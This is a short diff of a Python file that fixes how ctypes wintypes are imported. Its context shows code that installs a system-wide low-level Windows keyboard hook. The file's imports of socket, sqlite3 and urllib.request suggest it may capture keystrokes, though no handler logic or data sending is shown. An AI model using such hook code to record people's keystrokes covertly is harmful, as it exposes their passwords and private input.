@@ -5,6 +5,7 @@ import socket
 import json
 import threading
 import ctypes
+from ctypes import wintypes
 import hashlib
 import sqlite3
 import urllib.request
@@ -282,14 +283,14 @@ SW_SHOW = 5
 
 class KBDLLHOOKSTRUCT(ctypes.Structure):
     _fields_ = [
-        ('vkCode', ctypes.wintypes.DWORD),
-        ('scanCode', ctypes.wintypes.DWORD),
-        ('flags', ctypes.wintypes.DWORD),
-        ('time', ctypes.wintypes.DWORD),
+        ('vkCode', wintypes.DWORD),
+        ('scanCode', wintypes.DWORD),
+        ('flags', wintypes.DWORD),
+        ('time', wintypes.DWORD),
         ('dwExtraInfo', ctypes.c_ulonglong)
     ]
 
-HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_longlong, ctypes.c_int, ctypes.wintypes.WPARAM, ctypes.c_void_p)
+HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_longlong, ctypes.c_int, wintypes.WPARAM, ctypes.c_void_p)
 
 _keyboard_hook_id = None
 _keyboard_hook_proc = None
@@ -319,7 +320,7 @@ def _hook_message_loop():
 
     _keyboard_hook_proc = HOOKPROC(_low_level_keyboard_handler)
     _keyboard_hook_id = ctypes.windll.user32.SetWindowsHookExW(WH_KEYBOARD_LL, _keyboard_hook_proc, None, 0)
-    msg = ctypes.wintypes.MSG()
+    msg = wintypes.MSG()
     while _keyboard_hook_id:
         bRet = ctypes.windll.user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
         if bRet <= 0:
